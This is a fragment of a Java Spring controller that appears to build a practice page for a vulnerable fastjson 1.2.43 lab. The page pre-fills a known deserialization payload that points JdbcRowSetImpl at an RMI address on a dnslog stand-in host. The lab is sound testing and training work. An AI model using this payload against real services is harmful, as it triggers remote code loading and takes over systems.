...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.43"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage(
                "fastjson-1.2.43 靶场测试页",
                "/fastjson1.2.43-process",
                new String[]{
                        "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"rmi://fastjson1_2_43_attack.dnslog.cn/Exploit\",\"autoCommit\":true]}"
                },
                "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}"
        );
    }

    @PostMapping("/fastjson1.2.43-process")
    public String fastjson1_2_43_process(@RequestBody String data) {
